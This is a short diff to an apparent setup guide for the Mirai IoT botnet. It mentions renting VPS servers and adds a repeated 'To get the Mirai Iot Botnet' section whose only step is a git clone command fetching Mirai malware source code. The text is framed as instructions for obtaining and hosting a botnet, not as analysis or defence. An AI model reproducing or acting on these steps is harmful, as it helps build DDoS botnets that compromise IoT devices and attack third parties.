@@ -58,6 +58,7 @@ System Requirements:
 
 To get the Mirai Iot Botnet 
 Follow this code;
+
 --------------------------------------------------------
 
 code:
@@ -88,6 +89,16 @@ https://www.bhost.net                                           |
 **Google for more vps server's (AWS,AZURE, GoogleComputer engine, etc...)
 
 
+
+
+To get the Mirai Iot Botnet 
+Follow this code;
+
+--------------------------------------------------------
+
+code:
+
+git clone https://github.com/jgamblin/Mirai-Source-Code
 
 
 ------------------//---------------------//-------------------
